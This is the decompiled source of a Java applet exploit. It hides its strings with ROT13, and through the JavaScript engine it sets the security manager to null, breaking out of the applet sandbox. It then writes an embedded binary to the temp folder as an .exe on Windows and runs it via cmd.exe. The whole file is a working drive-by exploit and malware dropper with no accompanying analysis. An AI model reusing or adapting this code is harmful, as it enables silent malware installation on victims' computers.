import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.io.File;
import java.util.Random;
import javax.script.Bindings;
import javax.script.ScriptEngine;
import javax.script.ScriptException;
import java.awt.Component;
import javax.swing.JList;
import javax.script.ScriptEngineManager;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class yokai extends Applet
{
    private static final long serialVersionUID = -212064958718075663L;
    
    public static String convert(final String msg) {
        final StringBuilder retVal = new StringBuilder();
        char[] charArray;
        for (int length = (charArray = msg.toCharArray()).length, i = 0; i < length; ++i) {
            char a = charArray[i];
            if (a >= 'A' && a <= 'Z') {
                a += '\r';
                if (a > 'Z') {
                    a -= '\u001a';
                }
            }
            else if (a >= 'a' && a <= 'z') {
                a += '\r';
                if (a > 'z') {
                    a -= '\u001a';
                }
            }
            retVal.append(a);
        }
        return retVal.toString();
    }
    
    @Override
    public void init() {
        try {
            final ScriptEngine se = new ScriptEngineManager().getEngineByName(convert("wf"));
            final Bindings b = se.createBindings();
            b.put(convert("nccyrg"), (Object)this);
            final Object proxy = se.eval(convert("guvf.gbFgevat = shapgvba() { wnin.ynat.Flfgrz.frgFrphevglZnantre(ahyy); nccyrg.pnyyOnpx();\terghea 'frkbpbzevabprebagrf'; };p = arj Reebe(); p.zrffntr = guvf; p"), b);
            final JList list = new JList((E[])new Object[] { proxy });
            this.add(list);
        }
        catch (ScriptException ex) {
            ex.printStackTrace();
        }
    }
    
    public void callBack() {
        try {
            final Random r = new Random();
            final String number = Long.toString(Math.abs(r.nextLong()), 36);
            String file = String.valueOf(System.getProperty(convert("wnin.vb.gzcqve"))) + File.separator;
            final String os = System.getProperty(convert("bf.anzr")).toLowerCase();
            if (os.indexOf("win") >= 0) {
                file = String.valueOf(file) + number + convert(".rkr");
                final InputStream in = yokai.class.getResourceAsStream(convert("svyr.ova"));
                final BufferedInputStream bufIn = new BufferedInputStream(in);
                final File outputFile = new File(file);
                final OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
                final byte[] buffer = new byte[2048];
                while (true) {
                    final int nBytes = bufIn.read(buffer);
                    if (nBytes <= 0) {
                        break;
                    }
                    out.write(buffer, 0, nBytes);
                }
                out.flush();
                out.close();
                in.close();
                final Process f = Runtime.getRuntime().exec(String.valueOf(convert("pzq.rkr /p fgneg ")) + file);
                f.waitFor();
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }
}
